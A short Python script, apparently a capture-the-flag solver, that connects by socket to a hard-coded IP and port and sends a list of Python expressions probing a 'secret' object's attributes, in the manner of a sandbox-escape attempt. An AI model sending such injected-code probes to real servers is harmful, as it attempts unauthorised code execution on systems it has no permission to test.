import socket

# Connection details for nc
host = '34.101.36.1'  # The IP address for the server
port = 9010  # The port to connect to

def connect_and_send_payload(payload):
    try:
        # Create a socket connection to the target server
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))  # Connect to the server

            # Receive the welcome message from the server
            print(s.recv(1024).decode())  # Print the initial server response

            # Send the payload to the server
            s.sendall(payload.encode() + b'\n')  # Send payload with a newline to simulate user input

            # Receive the server's response after sending the payload
            response = s.recv(1024).decode()  # Read the server's response
            print("Server Response:", response)  # Print the response

    except Exception as e:
        print(f"Error: {e}")

# Example payloads to test
payloads = [
    "print(secret.__dict__.get('abs', 'Not Found'))",
    "print(secret.__dict__.get('any', 'Not Found'))",
    "print(secret.__dict__.get('ascii', 'Not Found'))",
    "print(secret.__dict__.get('bin', 'Not Found'))",
    "print(secret.__dict__.get('callable', 'Not Found'))",
    # Add more payloads as needed
]

# Brute force payloads and print responses
for payload in payloads:
    print(f"Trying payload: {payload}")
    connect_and_send_payload(payload)

